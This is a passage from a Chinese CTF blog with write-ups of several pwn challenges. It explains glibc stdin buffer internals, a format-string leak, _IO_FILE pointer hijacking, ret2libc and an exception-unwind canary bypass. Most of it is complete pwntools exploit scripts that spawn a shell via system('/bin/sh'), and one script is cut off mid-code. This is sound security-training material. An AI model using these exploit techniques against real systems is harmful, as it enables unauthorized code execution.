(_IO_LINE_BUF|_IO_UNBUFFERED))    {      /* We used to flush all line-buffered stream.  This really isn't         required by any standard.  My recollection is that         traditional Unix systems did this for stdout.  stderr better         not be line buffered.  So we do just that here         explicitly.  --drepper */      _IO_acquire_lock (stdout);      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))          == (_IO_LINKED | _IO_LINE_BUF))        _IO_OVERFLOW (stdout, EOF);      _IO_release_lock (stdout);    }  _IO_switch_to_get_mode (fp);  /* This is very tricky. We have to adjust those     pointers before we call _IO_SYSREAD () since     we may longjump () out while waiting for     input. Those pointers may be screwed up. H.J. */  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;  fp->_IO_read_end = fp->_IO_buf_base;  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end    = fp->_IO_buf_base;  count = _IO_SYSREAD (fp, fp->_IO_buf_base,                       fp->_IO_buf_end - fp->_IO_buf_base);//向_IO_buf_base处写入数据,读取的实际长度是_IO_buf_end -_IO_buf_base  if (count <= 0)    {      if (count == 0)        fp->_flags |= _IO_EOF_SEEN;      else        fp->_flags |= _IO_ERR_SEEN, count = 0;  }  fp->_IO_read_end += count;//读取结束后_IO_read_end加上读取的长度  if (count == 0)    {      /* If a stream is read to EOF, the calling application may switch active         handles.  As a result, our offset cache would no longer be valid, so         unset it.  */      fp->_offset = _IO_pos_BAD;      return EOF;    }  if (fp->_offset != _IO_pos_BAD)    _IO_pos_adjust (fp->_offset, count);  return *(unsigned char *) fp->_IO_read_ptr;}</code></pre><p>这里是把数据读到缓冲区,read_ptr指针是把数据从缓冲区读到用户空间,所以这里read_ptr指针要比较大</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604907487628.png" alt="指针情况"></p><p>实际IO_file结构在内存中的情况是</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604909452890.png" alt="IO_file结构"></p><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>泄露libc加载地址。是原始偏移加上栈上的偏移，一般情况下64位程序的原始偏移是6，如题的0xf+6=21，wp里面用%21$p进行泄露.</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604902851396.png" alt="偏移"></p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><ul><li>用格式化字符串漏洞修改栈里面的_IO_file结构</li><li>用scanf函数向修改后的_IO_buf_base结构写入数据修改_IO_buf_base和_IO_buf_end 指针修改为main函数的返回地址(一个栈地址)</li><li>持续的getchar让_IO_read_ptr追上_IO_read_end指针,这样才能再次读入数据</li><li>修改返回地址</li></ul><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x83</span> <span class="token operator">+</span> _IO_2_1_stdin_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000000106D</span><span class="token punctuation">,</span><span class="token number">0x000000000000FFE</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>完成上面第二步,在标记的地方就是写入数据开始的地方(原来IO_read_base指向的地方)</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604910603484.png" alt="修改后的IO_file"></p><p>但是这时read_ptr指针是小于read_end指针的所以需要调用多次getchar()实际上应该是调用lenpayload次(在发送上面payload的时候已经调用了一次,后面还需要lenpayload-1次)</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./Echo"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./Echo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>libccontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token comment" spellcheck="true"># p = remote('121.36.216.253',10001)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"User name:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">echo</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input size:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">echo2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input size:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"say:"</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    base<span class="token operator">=</span>info<span class="token operator">-</span>addr    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#leak</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x20840</span><span class="token punctuation">)</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#栈地址到加载地址的偏移会变</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$p"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pie_base<span class="token operator">=</span>get_base<span class="token punctuation">(</span><span class="token number">0x1107</span><span class="token punctuation">)</span>io_buffer_base<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">7</span>login<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"io_buffer_base:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>io_buffer_base<span class="token punctuation">)</span><span class="token punctuation">)</span>echo<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">131</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    echo2<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug([0x00000000000106D,0x0000000000000F77])</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>pie_base<span class="token operator">+</span><span class="token number">0x00000000000011b3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>echo2<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Choice >>"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># echo2("\n")</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>实际上这样构造payload的时候(多了个\n),实际上没有\n   scanf函数是能截断的</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdin_"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">131</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span></code></pre><p>上面的payload会设置一些指针然后会造成崩溃.</p><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯wp-pwn</title>
      <link href="2020/11/10/%E6%B9%96%E6%B9%98%E6%9D%AFpwn-wp/"/>
      <url>2020/11/10/%E6%B9%96%E6%B9%98%E6%9D%AFpwn-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn1-what-the-f-k-printf"><a href="#pwn1-what-the-f-k-printf" class="headerlink" title="pwn1 what the f**k printf?"></a>pwn1 what the f**k printf?</h2><p>输入16个32能够溢出</p><p>泄露libc   获取shell</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>local<span class="token operator">=</span><span class="token number">1</span>pop_rdi_ret<span class="token operator">=</span><span class="token number">0x0000000000401213</span>valu_addr<span class="token operator">=</span><span class="token number">0x000000000401181</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token comment" spellcheck="true"># pop= int(enhex(asm("pop rdi;ret")),16)</span><span class="token comment" spellcheck="true"># print</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn_printf"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You will find this game very interesting\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(pop)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">50015</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"32"</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./pwn_printf"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p,"b *0x0000000000401181")</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>valu_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>libc_info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">"\x00\x00"</span>libc_info<span class="token operator">=</span>u64<span class="token punctuation">(</span>libc_info<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_info<span class="token number">-0x6f6a0</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_info<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1.直接用call函数不是更好?为什么在call完之后调用</span></code></pre><p>遇到问题:</p><ul><li>原来使用Ubuntu18的环境运行,在第二次拿shell的时候总是失败</li><li>偏移用libc_search搜索出来的,但是还是不准.</li><li>在第二次拿shell的时候可以跳过call,上面的脚本运行了call指令,实际上最好是不用call指令,用了call指令在Ubuntu18环境里可能会出问题,具体原因不知道.</li></ul><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><ul><li>在read的时候有off-by-one</li><li>在show_name的时候有格式化字符串漏洞</li><li>free之后指针没有清零,有doublefree</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604996256058.png" alt="try-catch过程"></p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604996932067.png" alt="函数实现"></p><p>unwind过程完成之后将会运行到程序的空间由用户定义的catch函数进行接下来的操作(注意:在catch之前不能修改返回地址可能会跳不到catch函数),整个过程跳过了canary检测</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604999037533.png" alt="catch函数"></p><p>直接进行了leave,ret跳过了canary的检测</p><p>leave指令进行了</p><pre class=" language-c"><code class="language-c">mov esp<span class="token punctuation">,</span>ebp<span class="token punctuation">;</span>  恢复esp同时回收局部变量空间pop ebp<span class="token punctuation">;</span>          从栈中恢复保存的ebp的值</code></pre><p>再次执行leave,ret指令的时候程序会跳转到ebp+4存放的地址将会是返回地址。</p><p>这里在堆上布置好rop</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./blend_pwn"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token comment" spellcheck="true"># p=process("./blend_pwn")</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">leak_result</span><span class="token punctuation">(</span>until<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>until<span class="token punctuation">)</span>    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>    result<span class="token operator">=</span>u64<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak_result  content address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">send_name</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">new_node</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input note:\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_node</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index>"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice >"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"666"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" want:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_formate_result</span><span class="token punctuation">(</span>until<span class="token operator">=</span><span class="token string">"0x"</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>info<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    info<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> info<span class="token punctuation">]</span>    <span class="token 